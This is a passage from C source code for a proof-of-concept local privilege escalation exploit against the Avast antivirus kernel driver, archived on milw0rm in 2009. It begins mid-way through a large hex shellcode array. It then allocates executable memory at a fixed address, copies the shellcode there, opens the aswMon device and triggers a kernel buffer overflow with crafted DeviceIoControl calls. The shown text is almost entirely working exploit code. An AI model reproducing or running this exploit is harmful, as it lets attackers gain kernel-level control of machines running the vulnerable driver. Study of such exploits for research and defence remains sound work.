        0x13f4dcd7, 0xcf47b89b, 0x108d824a, 0x21236797,
        0x4cac84a5, 0xb33821ce, 0x542a9975, 0xf66135c2,
        0x30b9634a, 0x9bde472a, 0x50e29c43, 0x1224e64d,
        0x140aa049, 0x48c6d7eb, 0xf171704c, 0x80987f37,
        0x88da2c1d, 0xf337fbfe, 0xd52f414a, 0x76581549,
        0x75d22530, 0x293f3f41, 0x20b6cf21, 0xccd9f240,
        0x46ddeacd, 0x4e16d64e, 0x0e64fe89, 0x445de8d3,
        0x4d7983a6, 0x9f44fe8c, 0xf4e56281, 0xa7aad55b,
        0x07270a01, 0x77501d16, 0xf848ee54, 0x34f4ba27,
        0x244da047, 0x0ca62989, 0xbb5e2e05, 0x9612ca12,
        0x1b7c8cc7, 0xd2d672e6, 0x0caac1da, 0x1ae2cf8a,
        0x92bd47e9, 0xfeb1f194, 0xc0628cbd, 0xecc1a399,
        0x1a9f95f0, 0x29648b2b, 0x9c447a54, 0xad6d85e2,
        0x9bd983e7, 0x880f0eb1, 0xbea4a1a9, 0x3717e013,
        0x89e486dd, 0xe86bcc12, 0xc43fe5a5, 0xc50a72b4,
        0x396f4517, 0x2c8b865e, 0x3f022a7f, 0x0c5bc9bb,
        0x13fd077b, 0xcb6bd83d, 0x20c3e64b, 0x254e3a66,
        0xbcb22492, 0x57caa096, 0x8ba670d9, 0x547d5784,
        0xec8bf3f8, 0xf5b1ff55, 0x30620957, 0x43a3264a,
        0xdc6a0482, 0x270f2162, 0x15518268, 0xf4f3d923,
        0xfc6cdb9e, 0x91d3e097, 0xe49d4ba4, 0xe47a3b34,
        0xc18383a6, 0x5508af9a, 0xf2c8fcc8, 0xed417653,
        0xe3f4cf27, 0x6a777f65, 0xe9c3dae6, 0xfec2e74c,
        0x143f7e6d, 0xa8dc757c, 0xb8c48b07, 0x6a41964d,
        0x0994e2e4, 0x86ba5562, 0x4ebdb204, 0x6913dc92,
        0x3bd205a8, 0x2018395a, 0x804c5bb8, 0xa159fa18,
        0x7ccdfb1e, 0x146c6abc, 0x9c59a9ce, 0xe2f7d37d,
        0x699918e3, 0xde22536a, 0xfae6dd7c, 0x8a228eab,
        0xf657ae31, 0x97d59acb, 0xb1f6e1b7, 0xbc41be1c,
        0xc2572c95, 0x342f56a9, 0x349aeff3, 0xcbe3c7d9,
        0x080d46fe, 0x0e1d753c, 0xe4760d5c, 0x0cde715c,
        0x7d129f23, 0xab63fbbe, 0x9d734af8, 0xc2daebce,
        0x0619e8ee, 0x2c5b3a41, 0xd5db4193, 0x943fce43,
        0x0256feeb, 0x83a424bd, 0xe27f259b, 0x67ef724b,
        0x99c97ae1, 0x8bfa552e, 0x73e3191c, 0xe94365e5,
        0x92291d29, 0x7a28b911, 0x4ae8b691, 0xafba0345,
        0xbac0a0ba, 0x677713c2, 0x1a7fc599, 0x8978a9c1,
        0xe8f62f56, 0x58f7969a
        };

    DWORD ShellcodeToExecute;
    
    int choix;
    memset(welcome, 0x61, 100);
    welcome[100] = 0;

    ZeroMemory(out,sizeof(out));

    printf("Avast Kernel Buffer Overflow Vulnerability\nProof Of Concept...\n\n");
    getch();
    
    MajShellcode("LocalEscalation_Avast.exe");
    MajRealShellcode();
    MajRealStack();
    
    ShellcodeToExecute = (DWORD) VirtualAlloc((void*)0x57520000, 0x10000, MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    ShellcodeToExecute = (DWORD) VirtualAlloc((void*)0x57520000, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    memcpy((void*)0x57523c00, UpdateAswMon, sizeof(UpdateAswMon));
    memcpy((void*)0x57523c00+sizeof(UpdateAswMon), ShellcodeMaster, sizeof(ShellcodeMaster));
    
    printf("Connecting...    ");
    
    hDevice = CreateFile("\\\\.\\aswMon",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    while(hDevice == (HANDLE) 0xffffffff){
      hDevice = CreateFile("\\\\.\\aswMon",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
      Sleep(1000);
    }
    printf("Found !\nHandle : %p\n",hDevice);
       
    DeviceIoControl(hDevice,0xb2c8000c, Crashing,sizeof(Crashing),0,0,&NombreByte,NULL);
    DeviceIoControl(hDevice,0xb2c8000c, Crashing,sizeof(Crashing),0,0,&NombreByte,NULL);
    AfficherListeFichiers();
    printf("Written.\n");

    CloseHandle(hDevice);
    getch();
    return 0;
}

// milw0rm.com [2009-08-24]